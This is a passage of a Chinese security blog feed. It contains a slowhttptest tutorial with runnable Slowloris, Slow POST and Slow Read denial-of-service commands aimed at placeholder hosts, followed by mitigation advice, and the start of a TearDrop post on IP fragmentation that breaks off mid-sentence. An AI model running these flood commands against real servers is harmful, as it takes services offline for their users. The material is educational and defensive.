<h4 id="———————————————————"><a href="#———————————————————" class="headerlink" title="———————————————————"></a>———————————————————</h4><p>[ ulimit -n 1024 ] 指定同一时间能并发打开的文件数为 1024；&emsp;   [ -c 1000 ] 指定测试过程中与目标建立的连接数为1000；&emsp; [ -H ]  指定开始SlowLoris攻击模式并发送未完成的HTTP请求；&emsp;[ -g -o my_header_stats ] 让Slowhttptest生成CSV和HTML的报告文件,并指定路径／文件名 ；&emsp; [ -i 10 ] Specifies the interval between follow up data ；&emsp; [ -r 100 ]  指定连接速率为100/s ； &emsp;[ -t GET ] 通过GET方式连接 ； &emsp; [ -u <a href="https://host.example.com/index.html" target="_blank" rel="external">https://host.example.com/index.html</a> ]指定URL； &emsp; [ -x 24 ] 启用慢速读取测试； &emsp; [ -p 3 ] 官方：在判断server被DoS之前，发送连接请求之后，等待HTTP response的时间间隔为3S || 笔者：client发送request请求3S内没接收到server的response就标志服务器被DoS </p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/fd2a33c96b9948cf7a2edb4950c6f04f/xmlnote/D3BC7F6FD23140DBB947B632A70D837B/2142" alt="image"></p>
<h3 id="可以看到几秒钟web服务器的连接池就被占满无法访问，下面是生成的html报告"><a href="#可以看到几秒钟web服务器的连接池就被占满无法访问，下面是生成的html报告" class="headerlink" title="[*]可以看到几秒钟web服务器的连接池就被占满无法访问，下面是生成的html报告"></a>[*]可以看到几秒钟web服务器的连接池就被占满无法访问，下面是生成的html报告</h3><p><img src="http://note.youdao.com/yws/public/resource/fd2a33c96b9948cf7a2edb4950c6f04f/xmlnote/A198B372BDAD4A2E91DCED2BC84E0D66/2146" alt="image"></p>
<hr>
<h1 id="0x03-Slow-Http-Post模式"><a href="#0x03-Slow-Http-Post模式" class="headerlink" title="0x03. Slow Http Post模式"></a>0x03. Slow Http Post模式</h1><h2 id="Slow-Http-Post攻击原理"><a href="#Slow-Http-Post攻击原理" class="headerlink" title="Slow Http Post攻击原理"></a>Slow Http Post攻击原理</h2><h4 id="1-Slow-Http-Post也称作Slow-body-其本质也是通过耗尽服务器的连接池来达到攻击目的，而且攻击过程和上面提到的Slowloris差不多"><a href="#1-Slow-Http-Post也称作Slow-body-其本质也是通过耗尽服务器的连接池来达到攻击目的，而且攻击过程和上面提到的Slowloris差不多" class="headerlink" title="1. Slow Http Post也称作Slow body,其本质也是通过耗尽服务器的连接池来达到攻击目的，而且攻击过程和上面提到的Slowloris差不多"></a>1. Slow Http Post也称作Slow body,其本质也是通过耗尽服务器的连接池来达到攻击目的，而且攻击过程和上面提到的Slowloris差不多</h4><h4 id="2-在Post攻击中http-header头是完整发送的，但是这里会利用header头里面的content-length字段，正常情况下content-length的长度就是所要发送的数据长度，但是攻击者可以定制client发送的content-length，于是如果攻击者发送一个content-length特别大的值，那么server就会等待后续没有传完的body内容"><a href="#2-在Post攻击中http-header头是完整发送的，但是这里会利用header头里面的content-length字段，正常情况下content-length的长度就是所要发送的数据长度，但是攻击者可以定制client发送的content-length，于是如果攻击者发送一个content-length特别大的值，那么server就会等待后续没有传完的body内容" class="headerlink" title="2. 在Post攻击中http header头是完整发送的，但是这里会利用header头里面的content-length字段，正常情况下content-length的长度就是所要发送的数据长度，但是攻击者可以定制client发送的content-length，于是如果攻击者发送一个content-length特别大的值，那么server就会等待后续没有传完的body内容"></a>2. 在Post攻击中http header头是完整发送的，但是这里会利用header头里面的content-length字段，正常情况下content-length的长度就是所要发送的数据长度，但是攻击者可以定制client发送的content-length，于是如果攻击者发送一个content-length特别大的值，那么server就会等待后续没有传完的body内容</h4><h4 id="3-此时攻击者会延迟发送后续的body甚至是不发送，但是server端依旧会在等待并为其保留连接池并持续等待后续信息直到连接超时"><a href="#3-此时攻击者会延迟发送后续的body甚至是不发送，但是server端依旧会在等待并为其保留连接池并持续等待后续信息直到连接超时" class="headerlink" title="3. 此时攻击者会延迟发送后续的body甚至是不发送，但是server端依旧会在等待并为其保留连接池并持续等待后续信息直到连接超时"></a>3. 此时攻击者会延迟发送后续的body甚至是不发送，但是server端依旧会在等待并为其保留连接池并持续等待后续信息直到连接超时</h4><h4 id="4-问题来了，如果攻击者与服务器建立大量连接，而且都告诉server后续还要传输数据，那么server的连接池到达一定程度时就会被占满达到DoS攻击"><a href="#4-问题来了，如果攻击者与服务器建立大量连接，而且都告诉server后续还要传输数据，那么server的连接池到达一定程度时就会被占满达到DoS攻击" class="headerlink" title="4. 问题来了，如果攻击者与服务器建立大量连接，而且都告诉server后续还要传输数据，那么server的连接池到达一定程度时就会被占满达到DoS攻击"></a>4. 问题来了，如果攻击者与服务器建立大量连接，而且都告诉server后续还要传输数据，那么server的连接池到达一定程度时就会被占满达到DoS攻击</h4><h3 id="如果对上述原理不太理解，笔者给大家描述一个生活中常见的场景：当大家在麦当劳点餐的时候，最前面点餐的那个人点了一个汉堡，于是开始付钱，先付了一毛，给收银员说等我找找钱放哪了再付剩下的钱，但是又一直找不到不给，就一直霸站着收银台导致后面的客人无法点餐，如果德克士的每个收银台都被这样的客人霸占着，那么最后就会导致麦当劳无法做生意了，也就造成了DoS"><a href="#如果对上述原理不太理解，笔者给大家描述一个生活中常见的场景：当大家在麦当劳点餐的时候，最前面点餐的那个人点了一个汉堡，于是开始付钱，先付了一毛，给收银员说等我找找钱放哪了再付剩下的钱，但是又一直找不到不给，就一直霸站着收银台导致后面的客人无法点餐，如果德克士的每个收银台都被这样的客人霸占着，那么最后就会导致麦当劳无法做生意了，也就造成了DoS" class="headerlink" title="[*]如果对上述原理不太理解，笔者给大家描述一个生活中常见的场景：当大家在麦当劳点餐的时候，最前面点餐的那个人点了一个汉堡，于是开始付钱，先付了一毛，给收银员说等我找找钱放哪了再付剩下的钱，但是又一直找不到不给，就一直霸站着收银台导致后面的客人无法点餐，如果德克士的每个收银台都被这样的客人霸占着，那么最后就会导致麦当劳无法做生意了，也就造成了DoS"></a>[*]如果对上述原理不太理解，笔者给大家描述一个生活中常见的场景：当大家在麦当劳点餐的时候，最前面点餐的那个人点了一个汉堡，于是开始付钱，先付了一毛，给收银员说等我找找钱放哪了再付剩下的钱，但是又一直找不到不给，就一直霸站着收银台导致后面的客人无法点餐，如果德克士的每个收银台都被这样的客人霸占着，那么最后就会导致麦当劳无法做生意了，也就造成了DoS</h3><hr>
<h2 id="Slow-Http-Post攻击实战"><a href="#Slow-Http-Post攻击实战" class="headerlink" title="Slow Http Post攻击实战"></a>Slow Http Post攻击实战</h2><blockquote>
<p>ulimit -n 4096 &amp;&amp; slowhttptest -c 3000 -B -g -o /Users/apple1/Desktop/my_body_stats -i 110 -r 100 -s 8192 -t GET -u <a href="http://host.example.com/loginform.html" target="_blank" rel="external">http://host.example.com/loginform.html</a> -x 10 -p 3</p>
<h4 id="————————————————–"><a href="#————————————————–" class="headerlink" title="————————————————–"></a>————————————————–</h4><p>[ -B ] 启用Slow Http Post模式发送未完成的HTTP消息体； &emsp; [ -s ] 指定content-length长度为8192；</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/fd2a33c96b9948cf7a2edb4950c6f04f/xmlnote/215B04DDF5E647B488A009620A396817/2215" alt="image"></p>
<h3 id="下面是生成的报告"><a href="#下面是生成的报告" class="headerlink" title="[*]下面是生成的报告"></a>[*]下面是生成的报告</h3><p><img src="http://note.youdao.com/yws/public/resource/fd2a33c96b9948cf7a2edb4950c6f04f/xmlnote/34A759088BA449CB9CED8D6E2BD90C12/2217" alt="image"></p>
<hr>
<h1 id="0x04-Slow-Read-attack模式"><a href="#0x04-Slow-Read-attack模式" class="headerlink" title="0x04. Slow Read attack模式"></a>0x04. Slow Read attack模式</h1><h2 id="Slow-Read-attack攻击原理"><a href="#Slow-Read-attack攻击原理" class="headerlink" title="Slow Read attack攻击原理"></a>Slow Read attack攻击原理</h2><h4 id="1-正如名字所描述的那样，就是慢速读取server传输过来的数据，如果大家看过我的sockstress那篇文章可知client可以通过控制TCP的window-size来控制传输速率"><a href="#1-正如名字所描述的那样，就是慢速读取server传输过来的数据，如果大家看过我的sockstress那篇文章可知client可以通过控制TCP的window-size来控制传输速率" class="headerlink" title="1. 正如名字所描述的那样，就是慢速读取server传输过来的数据，如果大家看过我的sockstress那篇文章可知client可以通过控制TCP的window size来控制传输速率"></a>1. 正如名字所描述的那样，就是慢速读取server传输过来的数据，如果大家看过我的sockstress那篇文章可知client可以通过控制TCP的window size来控制传输速率</h4><h4 id="2-如果攻击者将window-size置为一个特别小的值，但是却又请求一个特别大的资源，那么服务器就会与这个连接进行长时间通信，如果建立的连接数足够大就会塞满server的连接池"><a href="#2-如果攻击者将window-size置为一个特别小的值，但是却又请求一个特别大的资源，那么服务器就会与这个连接进行长时间通信，如果建立的连接数足够大就会塞满server的连接池" class="headerlink" title="2. 如果攻击者将window size置为一个特别小的值，但是却又请求一个特别大的资源，那么服务器就会与这个连接进行长时间通信，如果建立的连接数足够大就会塞满server的连接池"></a>2. 如果攻击者将window size置为一个特别小的值，但是却又请求一个特别大的资源，那么服务器就会与这个连接进行长时间通信，如果建立的连接数足够大就会塞满server的连接池</h4><h4 id="3-当server端缓冲区未发送的资源堆积过多时还会导致缓冲区溢出，也无法响应其他请求"><a href="#3-当server端缓冲区未发送的资源堆积过多时还会导致缓冲区溢出，也无法响应其他请求" class="headerlink" title="3. 当server端缓冲区未发送的资源堆积过多时还会导致缓冲区溢出，也无法响应其他请求"></a>3. 当server端缓冲区未发送的资源堆积过多时还会导致缓冲区溢出，也无法响应其他请求</h4><h4 id="4-正如漏斗一样，漏斗口很小，但是我们却一个劲的往里面装沙子，这样迟早把漏斗涨满"><a href="#4-正如漏斗一样，漏斗口很小，但是我们却一个劲的往里面装沙子，这样迟早把漏斗涨满" class="headerlink" title="4. 正如漏斗一样，漏斗口很小，但是我们却一个劲的往里面装沙子，这样迟早把漏斗涨满"></a>4. 正如漏斗一样，漏斗口很小，但是我们却一个劲的往里面装沙子，这样迟早把漏斗涨满</h4><hr>
<h2 id="Slow-Read-attack攻击实战"><a href="#Slow-Read-attack攻击实战" class="headerlink" title="Slow Read attack攻击实战"></a>Slow Read attack攻击实战</h2><blockquote>
<p>ulimit -n 8000 &amp;&amp; slowhttptest -c 8000 -X -r 100 -g -o /Users/apple1/Desktop/my_header_stats -w 512 -y 1024 -n 5 -z 32 -k 3 -u <a href="https://host.example.com/resources/index.html" target="_blank" rel="external">https://host.example.com/resources/index.html</a> -p 3</p>
<h4 id="————————————————–-1"><a href="#————————————————–-1" class="headerlink" title="————————————————–"></a>————————————————–</h4><p>[ -X ] 指定使用Slow Read attack模式，缓慢读取HTTP响应请求； &emsp; [ -w 512 -y 1024 ] 指定window size大小为512~1024 byte； &emsp; [ -n 5 ] 指定读取数据的间隔为5S； &emsp; [ -z 32 ] 指定每次从接收数据的缓冲区中读取数据的长度为5 byte； &emsp; [ -k 3 ] 在同一连接中重复请求的次数为3次</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/fd2a33c96b9948cf7a2edb4950c6f04f/xmlnote/2FDA2F17DE3F4B4F83D431FECF90E94B/2271" alt="image"></p>
<h3 id="这次服务器不仅被DoS了，而且因为缓冲区溢出导致CPU被大量占用，导致无法执行其它系统命令"><a href="#这次服务器不仅被DoS了，而且因为缓冲区溢出导致CPU被大量占用，导致无法执行其它系统命令" class="headerlink" title="[*]这次服务器不仅被DoS了，而且因为缓冲区溢出导致CPU被大量占用，导致无法执行其它系统命令"></a>[*]这次服务器不仅被DoS了，而且因为缓冲区溢出导致CPU被大量占用，导致无法执行其它系统命令</h3><p><img src="http://note.youdao.com/yws/public/resource/fd2a33c96b9948cf7a2edb4950c6f04f/xmlnote/58E1534C04904F039062A35374EF529D/2275" alt="image"><br><img src="http://note.youdao.com/yws/public/resource/fd2a33c96b9948cf7a2edb4950c6f04f/xmlnote/B1142AF04FD44CEAA67BE9CFE983148F/2270" alt="image"></p>
<hr>
<h2 id="0x05-防御策略"><a href="#0x05-防御策略" class="headerlink" title="0x05. 防御策略"></a>0x05. 防御策略</h2><h4 id="1-将标题和消息体限制在最小的合理长度上。针对接受数据的每个资源，设置更严格的特定于URL的限制。"><a href="#1-将标题和消息体限制在最小的合理长度上。针对接受数据的每个资源，设置更严格的特定于URL的限制。" class="headerlink" title="1. 将标题和消息体限制在最小的合理长度上。针对接受数据的每个资源，设置更严格的特定于URL的限制。"></a>1. 将标题和消息体限制在最小的合理长度上。针对接受数据的每个资源，设置更严格的特定于URL的限制。</h4><h4 id="2-设置合理的连接超时时间"><a href="#2-设置合理的连接超时时间" class="headerlink" title="2. 设置合理的连接超时时间"></a>2. 设置合理的连接超时时间</h4><h4 id="3-定义最小传入数据速率，并删除比该速率慢的连接"><a href="#3-定义最小传入数据速率，并删除比该速率慢的连接" class="headerlink" title="3. 定义最小传入数据速率，并删除比该速率慢的连接"></a>3. 定义最小传入数据速率，并删除比该速率慢的连接</h4><h4 id="4-如果Web服务器从相同的IP接收到数千个连接，同一个用户代理在短时间内请求相同的资源，直接禁掉IP并且记录日志"><a href="#4-如果Web服务器从相同的IP接收到数千个连接，同一个用户代理在短时间内请求相同的资源，直接禁掉IP并且记录日志" class="headerlink" title="4. 如果Web服务器从相同的IP接收到数千个连接，同一个用户代理在短时间内请求相同的资源，直接禁掉IP并且记录日志"></a>4. 如果Web服务器从相同的IP接收到数千个连接，同一个用户代理在短时间内请求相同的资源，直接禁掉IP并且记录日志</h4><blockquote>
<p>具体的防御策略大家可以参考这篇<a href="http://blog.shekyan.com/2011/11/how-to-protect-against-slow-http-attacks.html" target="_blank" rel="external">文章</a></p>
</blockquote>
<hr>
<h2 id="0x06-结语"><a href="#0x06-结语" class="headerlink" title="0x06. 结语"></a>0x06. 结语</h2><h4 id="emsp-emsp-笔者的英文水平不是很好，但是这个工具国内资源又很少，不得不去看英文文章，所以可能有部分参数内容翻译不准确，还望大家多多指正！！"><a href="#emsp-emsp-笔者的英文水平不是很好，但是这个工具国内资源又很少，不得不去看英文文章，所以可能有部分参数内容翻译不准确，还望大家多多指正！！" class="headerlink" title="&emsp;&emsp;笔者的英文水平不是很好，但是这个工具国内资源又很少，不得不去看英文文章，所以可能有部分参数内容翻译不准确，还望大家多多指正！！"></a>&emsp;&emsp;笔者的英文水平不是很好，但是这个工具国内资源又很少，不得不去看英文文章，所以可能有部分参数内容翻译不准确，还望大家多多指正！！</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[TearDrop]]></title>
      <url>/2017/09/24/TearDrop/</url>
      <content type="html"><![CDATA[<h2 id="0x00-TearDrop简介"><a href="#0x00-TearDrop简介" class="headerlink" title="0x00. TearDrop简介"></a>0x00. TearDrop简介</h2><h4 id="emsp-emsp-TearDrop是存在于上个世纪的拒绝服务攻击，尽管对现代的电脑已经基本不管用了，但是了解它的原理仍然是我们需要掌握的，这篇文章笔者是写给自己看的，大家不感兴趣的话可以绕过。"><a href="#emsp-emsp-TearDrop是存在于上个世纪的拒绝服务攻击，尽管对现代的电脑已经基本不管用了，但是了解它的原理仍然是我们需要掌握的，这篇文章笔者是写给自己看的，大家不感兴趣的话可以绕过。" class="headerlink" title="&emsp;&emsp;TearDrop是存在于上个世纪的拒绝服务攻击，尽管对现代的电脑已经基本不管用了，但是了解它的原理仍然是我们需要掌握的，这篇文章笔者是写给自己看的，大家不感兴趣的话可以绕过。"></a>&emsp;&emsp;TearDrop是存在于上个世纪的拒绝服务攻击，尽管对现代的电脑已经基本不管用了，但是了解它的原理仍然是我们需要掌握的，这篇文章笔者是写给自己看的，大家不感兴趣的话可以绕过。</h4><a id="more"></a>
<hr>
<h2 id="0x01-数据链路层包结构分析"><a href="#0x01-数据链路层包结构分析" class="headerlink" title="0x01. 数据链路层包结构分析"></a>0x01. 数据链路层包结构分析</h2><p><img src="http://note.youdao.com/yws/public/resource/237c23bc1c03cfdf0c70f705bb0720f5/xmlnote/B533EFC592AA4E939434C55AB3F8E3DD/1714" alt="image"></p>
<h3 id="这是一个完整的数据链路层数据包结构图，下面笔者将介绍其中具体的包结构信息"><a href="#这是一个完整的数据链路层数据包结构图，下面笔者将介绍其中具体的包结构信息" class="headerlink" title="[*]这是一个完整的数据链路层数据包结构图，下面笔者将介绍其中具体的包结构信息"></a>[*]这是一个完整的数据链路层数据包结构图，下面笔者将介绍其中具体的包结构信息</h3><h4 id="1-目的地址：数据包目标MAC地址"><a href="#1-目的地址：数据包目标MAC地址" class="headerlink" title="1. 目的地址：数据包目标MAC地址"></a>1. 目的地址：数据包目标MAC地址</h4><h4 id="2-源地址：数据包来源MAC地址"><a href="#2-源地址：数据包来源MAC地址" class="headerlink" title="2. 源地址：数据包来源MAC地址"></a>2. 源地址：数据包来源MAC地址</h4><h4 id="3-类型：代表上层协议，对于数据链路层来说它的上层协议是IP协议-0x0800"><a href="#3-类型：代表上层协议，对于数据链路层来说它的上层协议是IP协议-0x0800" class="headerlink" title="3. 类型：代表上层协议，对于数据链路层来说它的上层协议是IP协议(0x0800)"></a>3. 类型：代表上层协议，对于数据链路层来说它的上层协议是IP协议(0x0800)</h4><h4 id="4-数据：数据部分中包含有上层协议数据，对于数据链路层来说就是网络层、传输层、应用层，占46-1500字节，也就是最大容纳的数据量是1500字节"><a href="#4-数据：数据部分中包含有上层协议数据，对于数据链路层来说就是网络层、传输层、应用层，占46-1500字节，也就是最大容纳的数据量是1500字节" class="headerlink" title="4. 数据：数据部分中包含有上层协议数据，对于数据链路层来说就是网络层、传输层、应用层，占46-1500字节，也就是最大容纳的数据量是1500字节"></a>4. 数据：数据部分中包含有上层协议数据，对于数据链路层来说就是网络层、传输层、应用层，占46-1500字节，也就是最大容纳的数据量是1500字节</h4><h4 id="5-FCS：FCS是数据帧校验位，用于确定数据包在传输过程中是否损坏"><a href="#5-FCS：FCS是数据帧校验位，用于确定数据包在传输过程中是否损坏" class="headerlink" title="5. FCS：FCS是数据帧校验位，用于确定数据包在传输过程中是否损坏"></a>5. FCS：FCS是数据帧校验位，用于确定数据包在传输过程中是否损坏</h4><hr>
<h2 id="0x02-IP数据包分析"><a href="#0x02-IP数据包分析" class="headerlink" title="0x02.IP数据包分析"></a>0x02.IP数据包分析</h2><p><img src="http://note.youdao.com/yws/public/resource/237c23bc1c03cfdf0c70f705bb0720f5/xmlnote/A11DDBD9481A44AD9849AFB9291744C9/1745" alt="image"></p>
<h3 id="上图相当于数据链路层的数据部分的详细结构"><a href="#上图相当于数据链路层的数据部分的详细结构" class="headerlink" title="[*]上图相当于数据链路层的数据部分的详细结构"></a>[*]上图相当于数据链路层的数据部分的详细结构</h3><h4 id="接下来分析一下IP数据包中主要的字段信息，也正是在IP数据包中会存在TearDrop攻击的原理："><a href="#接下来分析一下IP数据包中主要的字段信息，也正是在IP数据包中会存在TearDrop攻击的原理：" class="headerlink" title="接下来分析一下IP数据包中主要的字段信息，也正是在IP数据包中会存在TearDrop攻击的原理："></a>接下来分析一下IP数据包中主要的字段信息，也正是在IP数据包中会存在TearDrop攻击的原理：</h4><h4 id="1-Version：IP协议版本信息，现在一般是IPV4，占4bit-看清楚，是比特不是字节"><a href="#1-Version：IP协议版本信息，现在一般是IPV4，占4bit-看清楚，是比特不是字节" class="headerlink" title="1. Version：IP协议版本信息，现在一般是IPV4，占4bit(看清楚，是比特不是字节)"></a>1. Version：IP协议版本信息，现在一般是IPV4，占4bit(看清楚，是比特不是字节)</h4><h4 id="2-Total-Length：IP数据包的总长度"><a href="#2-Total-Length：IP数据包的总长度" class="headerlink" title="2. Total Length：IP数据包的总长度"></a>2. Total Length：IP数据包的总长度</h4><h4 id="3-Identification：该字段标记当前分片为第几个分片，当数据量过大超过1480字节时，IP层会将数据分段多次传输，但是都会带有相同的Identification来表示这是同一段数据，当接收端接受到所有的数据之后又会将这些小段数据重组成原来的报文数据"><a href="#3-Identification：该字段标记当前分片为第几个分片，当数据量过大超过1480字节时，IP层会将数据分段多次传输，但是都会带有相同的Identification来表示这是同一段数据，当接收端接受到所有的数据之后又会将这些小段数据重组成原来的报文数据" class="headerlink" title="3. Identification：该字段标记当前分片为第几个分片，当数据量过大超过1480字节时，IP层会将数据分段多次传输，但是都会带有相同的Identification来表示这是同一段数据，当接收端接受到所有的数据之后又会将这些小段数据重组成原来的报文数据"></a>3. Identification：该字段标记当前分片为第几个分片，当数据量过大超过1480字节时，IP层会将数据分段多次传输，但是都会带有相同的Identification来表示这是同一段数据，当接收端接受到所有的数据之后又会将这些小段数据重组成原来的报文数据</h4><h4 id="4-Flags：标志位，表示该报文是否分片，如果置为0x01则表示后面还有数据需要接受，与Identification一样是用来控制大数据-超过1480byte-传输的"><a href="#4-Flags：标志位，表示该报文是否分片，如果置为0x01则表示后面还有数据需要接受，与Identification一样是用来控制大数据-超过1480byte-传输的" class="headerlink" title="4. Flags：标志位，表示该报文是否分片，如果置为0x01则表示后面还有数据需要接受，与Identification一样是用来控制大数据(超过1480byte)传输的"></a>4. Flags：标志位，表示该报文是否分片，如果置为0x01则表示后面还有数据需要接受，与Identification一样是用来控制大数据(超过1480byte)传输的</h4><h4 id="5-Fragment-Offset：片偏移，当需要分片传输数据时用来表示当前分片在原数据字段的偏移量，以后重组数据时的排序依据"><a href="#5-Fragment-Offset：片偏移，当需要分片传输数据时用来表示当前分片在原数据字段的偏移量，以后重组数据时的排序依据" class="headerlink" title="5. Fragment Offset：片偏移，当需要分片传输数据时用来表示当前分片在原数据字段的偏移量，以后重组数据时的排序依据"></a>5. Fragment Offset：片偏移，当需要分片传输数据时用来表示当前分片在原数据字段的偏移量，以后重组数据时的排序依据</h4><h4 id="6-Time-To-Live：也就是常说的TTL值，表示当前报文还能生存多久，每经过一个路由器TTL值减一，用来减少网络垃圾"><a href="#6-Time-To-Live：也就是常说的TTL值，表示当前报文还能生存多久，每经过一个路由器TTL值减一，用来减少网络垃圾" class="headerlink" title="6. Time To Live：也就是常说的TTL值，表示当前报文还能生存多久，每经过一个路由器TTL值减一，用来减少网络垃圾"></a>6. Time To Live：也就是常说的TTL值，表示当前报文还能生存多久，每经过一个路由器TTL值减一，用来减少网络垃圾</h4><h4 id="7-Protocol：表示上层所用的协议，IP层上层协议可能是UDP、TCP、ICMP等"><a href="#7-Protocol：表示上层所用的协议，IP层上层协议可能是UDP、TCP、ICMP等" class="headerlink" title="7. Protocol：表示上层所用的协议，IP层上层协议可能是UDP、TCP、ICMP等"></a>7. Protocol：表示上层所用的协议，IP层上层协议可能是UDP、TCP、ICMP等</h4><h4 id="8-Source-IP-Address：源IP-emsp-emsp-Destination-IP-Address：目标IP"><a href="#8-Source-IP-Address：源IP-emsp-emsp-Destination-IP-Address：目标IP" class="headerlink" title="8. Source IP Address：源IP &emsp;&emsp;Destination IP Address：目标IP"></a>8. Source IP Address：源IP &emsp;&emsp;Destination IP Address：目标IP</h4><h4 id="9-Data：IP数据包实际传输的数据，当然所指的数据和IP包结构类似，需要层层划分才能得到真正传输的数据"><a href="#9-Data：IP数据包实际传输的数据，当然所指的数据和IP包结构类似，需要层层划分才能得到真正传输的数据" class="headerlink" title="9. Data：IP数据包实际传输的数据，当然所指的数据和IP包结构类似，需要层层划分才能得到真正传输的数据"></a>9. Data：IP数据包实际传输的数据，当然所指的数据和IP包结构类似，需要层层划分才能得到真正传输的数据</h4><h3 id="上面所介绍的IP包头总共占用20byte，所以Data部分最多还能传输1480byte的数据"><a href="#上面所介绍的IP包头总共占用20byte，所以Data部分最多还能传输1480byte的数据" class="headerlink" title="[*]上面所介绍的IP包头总共占用20byte，所以Data部分最多还能传输1480byte的数据"></a>[*]上面所介绍的IP包头总共占用20byte，所以Data部分最多还能传输1480byte的数据</h3><hr>
<h2 id="0x03-ICMP数据包抓包分析"><a href="#0x03-ICMP数据包抓包分析" class="headerlink" title="0x03. ICMP数据包抓包分析"></a>0x03. ICMP数据包抓包分析</h2><h4 id="emsp-emsp-上面介绍了这么多原理性的概念，那么接下来笔者实际抓取一些数据包来给大家分析看看包头结构。"><a href="#emsp-emsp-上面介绍了这么多原理性的概念，那么接下来笔者实际抓取一些数据包来给大家分析看看包头结构。" class="headerlink" title="&emsp;&emsp;上面介绍了这么多原理性的概念，那么接下来笔者实际抓取一些数据包来给大家分析看看包头结构。"></a>&emsp;&emsp;上面介绍了这么多原理性的概念，那么接下来笔者实际抓取一些数据包来给大家分析看看包头结构。</h4><h3 id="通过抓取ICMP数据包就可以很好的分析IP包结构，因为此时抓取到的数据包中IP上层协议只有ICMP，所以Data部分就只表示ICMP协议数据，没有更高层协议的影响"><a href="#通过抓取ICMP数据包就可以很好的分析IP包结构，因为此时抓取到的数据包中IP上层协议只有ICMP，所以Data部分就只表示ICMP协议数据，没有更高层协议的影响" class="headerlink" title="[*]通过抓取ICMP数据包就可以很好的分析IP包结构，因为此时抓取到的数据包中IP上层协议只有ICMP，所以Data部分就只表示ICMP协议数据，没有更高层协议的影响"></a>[*]通过抓取ICMP数据包就可以很好的分析IP包结构，因为此时抓取到的数据包中IP上层协议只有ICMP，所以Data部分就只表示ICMP协议数据，没有更高层协议的影响</h3><blockquote>
<p>sudo ping xx.xx.xx.xx -c 3 -s 5912</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/237c23bc1c03cfdf0c70f705bb0720f5/xmlnote/B15FCD14ADF4465A906C5C5594C1DE05/1884" alt="image"></p>
<h4 id="先介绍一下我所使用的命令，ping表示发送ICMP数据包，-c-3表示总共发3个ICMP层的数据包，-s-5912表示每个ICMP数据包中的数据量为5912-byte。"><a href="#先介绍一下我所使用的命令，ping表示发送ICMP数据包，-c-3表示总共发3个ICMP层的数据包，-s-5912表示每个ICMP数据包中的数据量为5912-byte。" class="headerlink" title="[*]先介绍一下我所使用的命令，ping表示发送ICMP数据包，-c 3表示总共发3个ICMP层的数据包，-s 5912表示每个ICMP数据包中的数据量为5912 byte。"></a>[*]先介绍一下我所使用的命令，ping表示发送ICMP数据包，-c 3表示总共发3个ICMP层的数据包，-s 5912表示每个ICMP数据包中的数据量为5912 byte。</h4><h4 id="之所以要用5912-byte，是为了满足1478-4-2-4-5920-也就是一个5912-byte大小的ICMP包一次性肯定发不完，所以需要分片发送，一个数据包发送的Data段最多为1480-1478-2-也就是我们所要求的数据-1478-byte-加上2-byte的Protocol协议号，这样分成4片刚好能发完"><a href="#之所以要用5912-byte，是为了满足1478-4-2-4-5920-也就是一个5912-byte大小的ICMP包一次性肯定发不完，所以需要分片发送，一个数据包发送的Data段最多为1480-1478-2-也就是我们所要求的数据-1478-byte-加上2-byte的Protocol协议号，这样分成4片刚好能发完" class="headerlink" title="[]之所以要用5912 byte，是为了满足1478\4 + 2*4 = 5920 ,也就是一个5912 byte大小的ICMP包一次性肯定发不完，所以需要分片发送，一个数据包发送的Data段最多为1480 = 1478 + 2 ,也就是我们所要求的数据(1478 byte)加上2 byte的Protocol协议号，这样分成4片刚好能发完"></a>[<em>]之所以要用5912 byte，是为了满足1478\</em>4 + 2*4 = 5920 ,也就是一个5912 byte大小的ICMP包一次性肯定发不完，所以需要分片发送，一个数据包发送的Data段最多为1480 = 1478 + 2 ,也就是我们所要求的数据(1478 byte)加上2 byte的Protocol协议号，这样分成4片刚好能发完</h4><h4 id="上面就是我所抓取到的数据包，可以看到包的Total-Length是1500-byte，包头占了20-byte，剩下的Data全部占满，占用了1480-byte。刚好分成4片传输5920-byte的Data"><a href="#上面就是我所抓取到的数据包，可以看到包的Total-Length是1500-byte，包头占了20-byte，剩下的Data全部占满，占用了1480-byte。刚好分成4片传输5920-byte的Data" class="headerlink" title="[*]上面就是我所抓取到的数据包，可以看到包的Total Length是1500 byte，包头占了20 byte，剩下的Data全部占满，占用了1480 byte。刚好分成4片传输5920 byte的Data"></a>[*]上面就是我所抓取到的数据包，可以看到包的Total Length是1500 byte，包头占了20 byte，剩下的Data全部占满，占用了1480 byte。刚好分成4片传输5920 byte的Data</h4><hr>
<h2 id="0x04-TearDrop攻击原理"><a href="#0x04-TearDrop攻击原理" class="headerlink" title="0x04. TearDrop攻击原理"></a>0x04. TearDrop攻击原理</h2><h4 id="emsp-emsp-写了这么多笔者都快写懵了-，但是必须要有上面的知识储备才能真正理解TearDrop形成的原理，所以我还是全部写下来了，还有就是为了以后再来回顾的时候很容易就能看懂，同时给大家普及一点协议方面的知识。"><a href="#emsp-emsp-写了这么多笔者都快写懵了-，但是必须要有上面的知识储备才能真正理解TearDrop形成的原理，所以我还是全部写下来了，还有就是为了以后再来回顾的时候很容易就能看懂，同时给大家普及一点协议方面的知识。" class="headerlink" title="&emsp;&emsp;写了这么多笔者都快写懵了:)，但是必须要有上面的知识储备才能真正理解TearDrop形成的原理，所以我还是全部写下来了，还有就是为了以后再来回顾的时候很容易就能看懂，同时给大家普及一点协议方面的知识。"></a>&emsp;&emsp;写了这么多笔者都快写懵了:)，但是必须要有上面的知识储备才能真正理解TearDrop形成的原理，所以我还是全部写下来了，还有就是为了以后再来回顾的时候很容易就能看懂，同时给大家普及一点协议方面的知识。</h4><h3 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h3><h4 id="1-最开始介绍了Fragment-Offset可以控制片偏移量，而正常情况下这是一个很不错的功能，可以帮助我们重组数据包，就如上面截图所示，但是作为一名安全研究者我们就要研究它不正常状态会发生什么情况"><a href="#1-最开始介绍了Fragment-Offset可以控制片偏移量，而正常情况下这是一个很不错的功能，可以帮助我们重组数据包，就如上面截图所示，但是作为一名安全研究者我们就要研究它不正常状态会发生什么情况" class="headerlink" title="1. 最开始介绍了Fragment Offset可以控制片偏移量，而正常情况下这是一个很不错的功能，可以帮助我们重组数据包，就如上面截图所示，但是作为一名安全研究者我们就要研究它不正常状态会发生什么情况"></a>1. 最开始介绍了Fragment 